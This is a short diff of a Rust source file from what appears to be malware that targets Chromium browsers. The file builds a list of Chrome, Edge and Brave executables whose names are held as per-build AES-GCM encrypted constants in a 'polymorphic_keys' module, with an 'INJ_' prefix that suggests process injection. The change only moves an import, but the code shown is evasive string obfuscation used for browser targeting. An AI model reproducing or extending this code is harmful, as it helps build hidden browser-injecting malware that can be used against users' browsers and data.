@@ -3,7 +3,6 @@
 //! runtime from AES-256-GCM encrypted constants (unique per build).
 
 use std::collections::HashMap;
-use crate::polymorphic_keys::aes_decrypt;
 
 #[derive(Clone, Copy)]
 pub enum DataRoot {
@@ -28,7 +27,7 @@ macro_rules! dec {
 }
 
 fn targets() -> Vec<ChromiumTarget> {
-    use crate::polymorphic_keys::*;
+    use crate::polymorphic_keys::{aes_decrypt, *};
     let chrome  = dec!(INJ_CHROME_EXE_ENC,  &INJ_CHROME_EXE_KEY,  &INJ_CHROME_EXE_NONCE);
     let edge    = dec!(INJ_EDGE_EXE_ENC,    &INJ_EDGE_EXE_KEY,    &INJ_EDGE_EXE_NONCE);
     let brave   = dec!(INJ_BRAVE_EXE_ENC,   &INJ_BRAVE_EXE_KEY,   &INJ_BRAVE_EXE_NONCE);
